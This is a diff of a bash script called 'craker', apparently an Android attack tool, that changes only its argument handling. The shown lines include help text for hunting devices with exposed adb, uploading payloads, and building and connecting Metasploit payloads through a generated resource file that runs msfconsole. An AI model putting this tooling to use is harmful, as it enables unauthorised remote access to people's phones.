@@ -17,12 +17,12 @@ fi
 }
 
 craker(){
-if [[ $1 == "--help" ]]
+if [[ $@ == "--help" ]]
 then
 echo -e "./craker --adb \e[2mAdb hacking tool\e[0m"
 echo -e "./craker --msfpay \e[2mCreated payload apk\e[0m"
 echo -e "./craker --uppay \e[2mUp to payloads\e[0m"
-elif [[ $1 == "--adb" ]]
+elif [[ $@ == "--adb" ]]
 then
 echo -e "adb: --find \e[2mFind vulnerable ip\e[0m"
 echo -e "adb: --upload <paylaod> \e[2mUpload payload\e[0m"
@@ -107,7 +107,7 @@ echo -e "View packages \e[2m[*]\e[0m"
 echo -e "\e[2m"
 adb shell pm list packages
 echo -e "\e[0m"
-elif [[ $1 == "--msfpay" ]]
+elif [[ $@ == "--msfpay" ]]
 then
 echo -e "msfpay: --crp <name> <host> <port> \e[2mCreated payload\e[0m"
 echo -e "msfpay: --cop <name> <host> <port> \e[2mConnect payload\e[0m"
@@ -126,7 +126,7 @@ set lhost $4
 set lport $5 
 run " > $3.rc
 msfconsole -r $3.rc 
-elif [[ $1 == "--uppay" ]]
+elif [[ $@ == "--uppay" ]]
 then
 echo -e "uppay: --backup <file> \e[2mFile to up \e[0m"
 elif [[ $2 == "--backup" ]]
@@ -141,5 +141,4 @@ echo -e "use: ./craker --help"
 fi
 }
 
-craker $1 $2 $3 $4 $5 
-
+craker $@
